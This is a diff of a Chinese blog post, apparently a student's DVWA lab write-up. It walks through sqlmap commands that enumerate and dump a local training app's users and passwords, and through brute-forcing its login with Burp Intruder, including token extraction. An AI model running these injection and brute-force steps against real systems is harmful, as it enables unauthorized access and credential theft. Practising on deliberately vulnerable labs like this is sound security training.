@@ -454,21 +454,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-07-06
+                    2023-07-07
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    466
+                    1.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    5 分
                 </div>
                 
 
@@ -490,7 +490,16 @@
 <p>ps：有好长一段时间没有学web了，一个月都在准备各种考试 QAQ，这几天花了点时间把kali虚拟机搭了一下，顺带着说dvwa靶场我是在kali里刷的，搭这个玩意着实麻烦……，但好处是不用再下工具了，kali就是为web渗透而生！<del>（一个苦逼花了快一天时间整完后的遗言）</del></p>
 <h2 id="0x01-SQL-Injection"><a href="#0x01-SQL-Injection" class="headerlink" title="0x01 SQL Injection"></a>0x01 SQL Injection</h2><hr>
 <h3 id="sqlmap工具注入"><a href="#sqlmap工具注入" class="headerlink" title="sqlmap工具注入"></a>sqlmap工具注入</h3><hr>
-<h5 id="low"><a href="#low" class="headerlink" title="low"></a>low</h5><p>由于是sql注入这里就不展示太多的sql关卡的打法，这里记录的是新工具的用法<strong>sqlmap</strong><del>（能自动何必手动）</del><br>这里附上<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37964989/article/details/84109094">链接</a>总结了sqlmap的一些常见命令。<br>以及打通这个关卡的<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV11W41157j3/?spm_id_from=333.337.search-card.all.click&vd_source=6b56c0a6f7c42ccbc63f5ce49fb71500">视频1</a>，<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1YA411R7pK/?spm_id_from=333.337.search-card.all.click&vd_source=6b56c0a6f7c42ccbc63f5ce49fb71500">视频2</a>更好理解<br>开始我们输入sqlmap后进入交互状态，然后先在low状态下的sql关卡输入1并抓包获取cookie<br>输入命令<br><code>sqlmap -u &quot;192.168.201.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot; security=low; PHPSESSID=uitdooscaev668qng96hju3vh8&quot; --batch</code><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/1.png"><br>可以看到我们爆出了注入点<br><code>sqlmap -u &quot;192.168.201.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot; security=low; PHPSESSID=uitdooscaev668qng96hju3vh8&quot; --dbs --batch</code><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/2.png"><br>列出库名<br><code>sqlmap -u &quot;192.168.201.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot; security=low; PHPSESSID=uitdooscaev668qng96hju3vh8&quot; --current-db --batch</code><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/3.png"><br>列出当前库名<br><code>sqlmap -u &quot;192.168.201.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot; security=low; PHPSESSID=uitdooscaev668qng96hju3vh8&quot; -D dvwa --tables --batch</code><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/4.png"><br>列出表名<br><code>sqlmap -u &quot;192.168.201.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot; security=low; PHPSESSID=uitdooscaev668qng96hju3vh8&quot; -D dvwa T users --columns --batch</code><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/5.png"><br>列出users表的字段信息<br><code>sqlmap -u &quot;192.168.201.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot; security=low; PHPSESSID=uitdooscaev668qng96hju3vh8&quot; -D dvwa T users C users,password,user_id --dump --batch</code><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/6.png"><br>打印你想要的信息并自动解密还会自动保存到本地上(倒数第二行告诉我们它的存储地址）直接复制去找就行，结果如下：<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/7.png"></p>
+<h5 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h5><p>由于是sql注入这里就不展示太多的sql关卡的打法，这里记录的是新工具的用法<strong>sqlmap</strong><del>（能自动何必手动）</del><br>这里附上<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37964989/article/details/84109094">链接</a>总结了sqlmap的一些常见命令。<br>以及打通这个关卡的<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV11W41157j3/?spm_id_from=333.337.search-card.all.click&vd_source=6b56c0a6f7c42ccbc63f5ce49fb71500">视频1</a>，<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1YA411R7pK/?spm_id_from=333.337.search-card.all.click&vd_source=6b56c0a6f7c42ccbc63f5ce49fb71500">视频2</a>更好理解<br>开始我们输入sqlmap后进入交互状态，然后先在low状态下的sql关卡输入1并抓包获取cookie<br>输入命令<br><code>sqlmap -u &quot;192.168.201.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot; security=low; PHPSESSID=uitdooscaev668qng96hju3vh8&quot; --batch</code><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/1.png"><br>可以看到我们爆出了注入点<br><code>sqlmap -u &quot;192.168.201.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot; security=low; PHPSESSID=uitdooscaev668qng96hju3vh8&quot; --dbs --batch</code><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/2.png"><br>列出库名<br><code>sqlmap -u &quot;192.168.201.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot; security=low; PHPSESSID=uitdooscaev668qng96hju3vh8&quot; --current-db --batch</code><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/3.png"><br>列出当前库名<br><code>sqlmap -u &quot;192.168.201.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot; security=low; PHPSESSID=uitdooscaev668qng96hju3vh8&quot; -D dvwa --tables --batch</code><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/4.png"><br>列出表名<br><code>sqlmap -u &quot;192.168.201.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot; security=low; PHPSESSID=uitdooscaev668qng96hju3vh8&quot; -D dvwa T users --columns --batch</code><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/5.png"><br>列出users表的字段信息<br><code>sqlmap -u &quot;192.168.201.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot; security=low; PHPSESSID=uitdooscaev668qng96hju3vh8&quot; -D dvwa T users C users,password,user_id --dump --batch</code><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/6.png"><br>打印你想要的信息并自动解密还会自动保存到本地上(倒数第二行告诉我们它的存储地址）直接复制去找就行，结果如下：<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/7.png"></p>
+<h5 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h5><p>这里我们没有输入框，但是我们可以通过把命令数据放进数据包来执行命令，下面举出一个例子：<br><code>sqlmap -r  /root/1.txt -D dvwa --tables --batch</code><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/8.png"><br>这里我们只要抓包然后将抓包后的所有内容复制到新的文本文件1.txt并告诉系统它的绝对路径，（如果和sqlmap相同路径就不用绝对路径了），这里我放在了root根目录下，可以看出直接用抓包数据还是很方便的，其他的一样。同时这里也有遇到一个问题<strong>如果你也出现了[07:53:47] [CRITICAL] specified file ‘&#x2F;root&#x2F;1.txt’ does not contain a usable HTTP request (with parameters)这个报错，<del>那么这件事是在是太酷啦</del>，目前测出来是1.txt文本要重新创建就可以成功避开，不知道什么原理</strong></p>
+<h5 id="High"><a href="#High" class="headerlink" title="High"></a>High</h5><p>这里碰到一个报错，实在不知道什么原因暂时就不发了，报错发一下[CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for ‘–level’&#x2F;‘–risk’ options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option ‘–tamper’ (e.g. ‘–tamper&#x3D;space2comment’) and&#x2F;or switch ‘–random-agent’<br>如果有有心人看到能告诉我就更好了……</p>
+<h2 id="0x02-Brute-Force"><a href="#0x02-Brute-Force" class="headerlink" title="0x02 Brute Force"></a>0x02 Brute Force</h2><hr>
+<h5 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h5><p>任意输入用户名和密码并抓包<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/9.png"><br>将结果右击送入intruder，先右击clean清除变量<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/10.png"><br>再add我们要爆破的变量，这里我们选定password<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/11.png"><br>payload选simple list，并导入自己网上下的字典，开始攻击<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/12.png"><br>当看到出现不一样长度的length就代表成功了，此密码可以登入<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/13.png"></p>
+<h5 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h5><p>和Low差不多只是在代码上加上了转义，一定程度上防御了sql注入</p>
+<h5 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h5><p>ps：这题巨麻烦要设置好多东西而且顺序还不能反</p>
+<ul>
+<li>Token是在客户端频繁向服务端请求数据，服务端频繁的去数据库查询用户名和密码并进行对比，判断用户名和密码正确与否，并作出相应提示，在这样的背景下，Token便应运而生。Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。Token的目的是为了减轻服务器的压力，减少频繁的查询数据库，使服务器更加健壮。<br>随便输入并先抓包，送给intruder，Attack type设置Pitchfork并把password和token设为爆破变量<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/14.png"><br>跳转到seting，找到Grep-Extract模块点击add进入下面界面，这里先点击fetch response后，这里有点难找可以在上面先输入value&#x3D;’然后双击那个token<strong>（记得复制！！！）</strong>，点击OK<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/15.png"><br>找到Redirections模块选Always<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/16.png"><br>回去设置payload第一个payload和上面Low一样，而后设置第二个如下，刚刚的token复制在框里：<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/17.png"><br>然后开始攻击，但是你可能会出现这个报错：<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/18.png"><br>这是因为我们没有设置线程的模块了，burp suite版本太新，给出解决<a target="_blank" rel="noopener" href="https://blog.csdn.net/Minorko/article/details/126018180">办法</a><br>最后开始攻击：<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/19.png"><br>可以看到在render里我们成功爆破进入</li>
+</ul>
 
                 
             </div>
@@ -1011,7 +1020,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">28.8k</span>&nbsp;字
+                class="white-color">29.7k</span>&nbsp;字
             
             
             
